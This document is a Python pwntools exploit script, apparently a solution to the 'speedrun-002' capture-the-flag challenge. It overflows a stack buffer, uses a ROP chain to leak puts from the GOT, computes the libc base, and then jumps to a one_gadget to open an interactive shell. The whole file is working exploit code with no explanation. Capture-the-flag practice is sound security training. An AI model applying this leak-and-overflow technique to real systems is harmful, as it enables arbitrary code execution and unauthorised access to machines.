from pwn import *
# context.log_level = "DEBUG"
pipe = process("./speedrun-002")
libc = ELF("./libc-2.27.so")
binary = ELF("./speedrun-002")

pop_rdi_ret = 0x4008a3
putsGOT = 0x601028
putsPLT = 0x4005b0
ret = 0x40074C

payload1 = "A"*1032
payload1 += p64(pop_rdi_ret).decode("iso-8859-1")
payload1 += p64(putsGOT).decode("iso-8859-1")
payload1 += p64(putsPLT).decode("iso-8859-1")
payload1 += p64(ret).decode("iso-8859-1")
# payload1 += p64(0x40071D).decode("iso-8859-1")

pipe.recvuntil("What say you now?\n")
pipe.sendline("Everything intelligent is so boring.")
pipe.recvline()
pipe.sendline(payload1)
pipe.recvuntil("Fascinating.\x0a")

leak = pipe.recvuntil("\x7f")
leak = u64(leak + b"\x00"*(8-len(leak)))
log.info("puts address: 0x%x" % leak)

libcBase = leak - libc.symbols['puts']
log.info("libc base address: 0x%x" % libcBase)



one_gadget = libcBase + 0x4f322
log.info("one_gadget: 0x%x" % one_gadget)
payload = "A" * 1032
payload += p64(one_gadget).decode("iso-8859-1")



pipe.sendline("Everything intelligent is so boring.")
pipe.recvuntil('Tell me more.\n')
pipe.sendline(payload)
sleep(1)
pipe.interactive()



